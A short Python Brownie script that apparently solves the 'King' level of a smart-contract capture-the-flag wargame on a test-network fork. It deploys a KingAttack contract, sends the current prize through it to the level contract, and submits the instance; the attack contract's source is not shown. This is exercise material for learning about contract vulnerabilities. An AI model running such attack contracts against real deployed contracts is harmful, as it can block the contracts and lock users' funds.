from brownie import King, KingAttack, web3

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "09_king"
INTERFACE_CONTRACT = King
INSTANCE_VALUE_WEI = web3.toWei(1, "ether")


def solve_level(level_contract):
    account = get_account()
    prize = level_contract.prize()
    # print("Prize -> " + str(prize))
    king_attack = KingAttack.deploy({"from": account})
    king_attack.attack(level_contract.address, {"from": account, "value": prize})


# brownie run scripts/_09_king.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
